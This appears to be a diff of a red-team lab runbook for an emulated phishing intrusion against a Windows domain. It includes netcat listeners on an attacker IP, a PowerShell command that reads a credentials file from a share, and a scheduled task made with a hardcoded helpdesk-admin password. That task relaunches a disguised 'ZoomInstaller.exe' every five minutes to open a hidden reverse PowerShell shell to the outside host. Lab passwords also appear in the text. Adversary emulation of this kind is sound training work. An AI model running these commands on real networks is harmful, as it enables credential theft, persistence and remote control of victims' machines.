@@ -1,11 +1,6 @@
-Missing:
-- Outlook for Timothy Turner
-- Mapped Share
-
-
 Level #1 Steps:
 -----------------------------------------------------------------------------------------
-0. Login into Kali VM (pass: Extinct^Quote4^Ruby)
+0. Login into Kali VM
 	a. ssh -o 'IdentitiesOnly=yes' delta@191.232.179.179
 1. Make sure SSH server is up and running on attacker host, configured for public key authentication
 2. Open a terminal window
@@ -17,7 +12,7 @@ Level #1 Steps:
 	a. nc -nlvp 45252
 	b. nc -nlvp 45253
 ------------------------------------------------------------------------------------------
-6. Login into Window 10 VM (as domain user Timothy Turner) - pass: Cha0sisaladder
+6. Login into Window 10 VM (as domain user Timothy Turner)
 7. Open Google Chrome and check Outlook email
 8. Find malicious recruitment phish - go to google drive link - and download zip file inside.
 9. Unzip the file in Downloads.
@@ -76,7 +71,7 @@ rm $env:APPDATA\sales_reports.txt
 
 rm $env:APPDATA\svchost.ps1
 
-gc '\\vm-win10-1\MyShare\creds.txt' | sls "password"
+gc '\\vm-win10-1\MyShare\Creds.txt' | sls "password"
 
 Start-Process -Cred $(New-Object System.Management.Automation.PSCredential ('C3XDCR\helpdesk-admin', $(ConvertTo-SecureString "Cha0sisaladder" -AsPlainText -Force))) -FilePath C:\Windows\System32\schtasks.exe -ArgumentList "/Create /RU C3XDCR\helpdesk-admin /RP Cha0sisaladder /TN Backups /SC MINUTE /MO 5 /TR `"C:\Users\tturner\AppData\Roaming\ZoomInstaller.exe 191.232.179.179 45253 -e \`"$Env:SystemRoot\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -noprofile -windowstyle hidden\`"`"" -WorkingDir C:\Windows\System32
 
